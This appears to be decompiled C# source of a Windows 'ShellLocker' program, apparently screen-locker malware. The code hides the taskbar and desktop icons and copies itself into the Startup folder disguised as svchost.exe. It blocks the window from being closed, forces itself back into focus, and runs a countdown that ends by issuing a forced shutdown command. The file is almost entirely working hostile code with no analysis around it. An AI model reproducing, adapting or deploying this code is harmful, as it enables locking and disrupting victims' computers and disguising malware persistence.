using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ShellLocker.My;

namespace ShellLocker
{
	// Token: 0x0200000B RID: 11
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x0600001E RID: 30 RVA: 0x00002520 File Offset: 0x00000720
		public Form1()
		{
			base.Load += this.Form1_Load;
			base.LostFocus += this.Form1_LostFocus;
			base.FormClosing += this.Form1_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600001F RID: 31 RVA: 0x0000256F File Offset: 0x0000076F
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ClassStyle |= 512;
				return createParams;
			}
		}

		// Token: 0x06000020 RID: 32
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

		// Token: 0x06000021 RID: 33
		[DllImport("User32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern void SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, int wFlags);

		// Token: 0x06000022 RID: 34 RVA: 0x0000258C File Offset: 0x0000078C
		public void TaskBarVisible(bool Visible)
		{
			string text = "Shell_TrayWnd";
			string text2 = "";
			int num = Form1.FindWindow(ref text, ref text2);
			if (Visible)
			{
				Form1.SetWindowPos(num, 0, 0, 0, 0, 0, 64);
				return;
			}
			Form1.SetWindowPos(num, 0, 0, 0, 0, 0, 128);
		}

		// Token: 0x06000023 RID: 35
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

		// Token: 0x06000024 RID: 36
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

		// Token: 0x06000025 RID: 37
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState(int vkey);

		// Token: 0x06000026 RID: 38 RVA: 0x000025D0 File Offset: 0x000007D0
		private void Form1_Load(object sender, EventArgs e)
		{
			try
			{
				Screen screen = Screen.AllScreens[1];
				MyProject.Forms.Form2.StartPosition = FormStartPosition.Manual;
				MyProject.Forms.Form2.Location = screen.Bounds.Location + (Size)new Point(100, 100);
				MyProject.Forms.Form2.Show();
				this.Timer2.Start();
			}
			catch (Exception ex)
			{
			}
			this.TaskBarVisible(false);
			MyProject.Forms.Form3.Show();
			MyProject.Forms.Form4.Show();
			Desktop.DesktopIconsHide();
			try
			{
				File.Copy(Application.ExecutablePath, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe");
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000026C4 File Offset: 0x000008C4
		private void Form1_LostFocus(object sender, EventArgs e)
		{
			base.Focus();
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000026CD File Offset: 0x000008CD
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (e.CloseReason == CloseReason.UserClosing)
			{
				e.Cancel = true;
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000026DF File Offset: 0x000008DF
		private void Timer1_Tick(object sender, EventArgs e)
		{
			base.BringToFront();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000026E8 File Offset: 0x000008E8
		private void Timer2_Tick(object sender, EventArgs e)
		{
			this.Label13.Text = Conversions.ToString(Conversions.ToDouble(this.Label13.Text) - 1.0);
			if (Conversions.ToDouble(this.Label13.Text) == 10.0)
			{
				this.Label13.ForeColor = Color.Red;
			}
			if (Conversions.ToDouble(this.Label13.Text) == 0.0)
			{
				this.Label13.ForeColor = Color.White;
				this.Label10.Text = Conversions.ToString(Conversions.ToDouble(this.Label10.Text) - 1.0);
				this.Label13.Text = Conversions.ToString(59);
			}
			if (Conversions.ToDouble(this.Label10.Text) == 10.0)
			{
				this.Label10.ForeColor = Color.Red;
			}
			if (Conversions.ToDouble(this.Label10.Text) == 0.0)
			{
				this.Label10.ForeColor = Color.White;
				this.Label8.Text = Conversions.ToString(Conversions.ToDouble(this.Label8.Text) - 1.0);
				this.Label10.Text = Conversions.ToString(59);
			}
			if (Conversions.ToDouble(this.Label8.Text) == 10.0)
			{
				this.Label8.ForeColor = Color.Red;
			}
			if (Conversions.ToDouble(this.Label8.Text) == 0.0)
			{
				this.Label13.ForeColor = Color.White;
				Interaction.Shell("shutdown -s -t 3", AppWinStyle.MinimizedFocus, false, -1);
			}
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x0600002D RID: 45 RVA: 0x00002F8D File Offset: 0x0000118D
		// (set) Token: 0x0600002E RID: 46 RVA: 0x00002F98 File Offset: 0x00001198
		internal virtual Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x0600002F RID: 47 RVA: 0x00002FDB File Offset: 0x000011DB
		// (set) Token: 0x06000030 RID: 48 RVA: 0x00002FE3 File Offset: 0x000011E3
		internal virtual PictureBox PictureBox1
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000031 RID: 49 RVA: 0x00002FEC File Offset: 0x000011EC
		// (set) Token: 0x06000032 RID: 50 RVA: 0x00002FF4 File Offset: 0x000011F4
		internal virtual Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
				Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000033 RID: 51 RVA: 0x00003037 File Offset: 0x00001237
		// (set) Token: 0x06000034 RID: 52 RVA: 0x0000303F File Offset: 0x0000123F
		internal virtual Label Label8
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000035 RID: 53 RVA: 0x00003048 File Offset: 0x00001248
		// (set) Token: 0x06000036 RID: 54 RVA: 0x00003050 File Offset: 0x00001250
		internal virtual Label Label10
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000037 RID: 55 RVA: 0x00003059 File Offset: 0x00001259
		// (set) Token: 0x06000038 RID: 56 RVA: 0x00003061 File Offset: 0x00001261
		internal virtual Label Label11
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000039 RID: 57 RVA: 0x0000306A File Offset: 0x0000126A
		// (set) Token: 0x0600003A RID: 58 RVA: 0x00003072 File Offset: 0x00001272
		internal virtual Label Label13
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600003B RID: 59 RVA: 0x0000307B File Offset: 0x0000127B
		// (set) Token: 0x0600003C RID: 60 RVA: 0x00003083 File Offset: 0x00001283
		internal virtual Label Label12
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x0600003D RID: 61 RVA: 0x0000308C File Offset: 0x0000128C
		// (set) Token: 0x0600003E RID: 62 RVA: 0x00003094 File Offset: 0x00001294
		internal virtual GroupBox GroupBox1
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x0400000D RID: 13
		public const int VK_LWIN = 91;

		// Token: 0x0400000E RID: 14
		public const int KEYEVENTF_KEYUP = 2;

		// Token: 0x0400000F RID: 15
		private int i;

		// Token: 0x04000010 RID: 16
		private int i2;

		// Token: 0x04000011 RID: 17
		private int i3;

		// Token: 0x04000012 RID: 18
		private int i4;

		// Token: 0x04000013 RID: 19
		private int i5;

		// Token: 0x04000014 RID: 20
		private new string Location;

		// Token: 0x04000015 RID: 21
		private const int SETDESKWALLPAPER = 20;

		// Token: 0x04000016 RID: 22
		private const int UPDATEINIFILE = 1;

		// Token: 0x04000017 RID: 23
		private RichTextBox erhaltenerText;

		// Token: 0x04000018 RID: 24
		private string path1;

		// Token: 0x04000019 RID: 25
		private string path2;

		// Token: 0x0400001A RID: 26
		private object userDir;

		// Token: 0x0400001B RID: 27
		private static List<WeakReference> __ENCList = new List<WeakReference>();
	}
}
